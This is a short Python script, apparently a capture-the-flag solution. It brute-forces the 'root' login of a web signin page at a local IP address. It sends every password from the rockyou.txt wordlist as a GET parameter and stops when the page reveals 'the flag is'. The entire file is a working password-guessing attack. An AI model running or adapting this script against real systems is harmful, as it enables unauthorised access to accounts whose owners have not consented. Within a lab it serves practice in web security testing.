import requests
import json

if __name__ == "__main__":
    with open("rockyou.txt", "r") as f:
        for l in f:
            url = "http://192.168.1.59/index.php?page=signin&username=root&password={}&Login=Login#".format(l[:-1])
            print(url)
            r = requests.get(url)
            if r.status_code == 200:
                resp = str(r.content)
                if resp.lower().find("the flag is") != -1:
                    print(l[:-1])
                    print(resp)
                    break
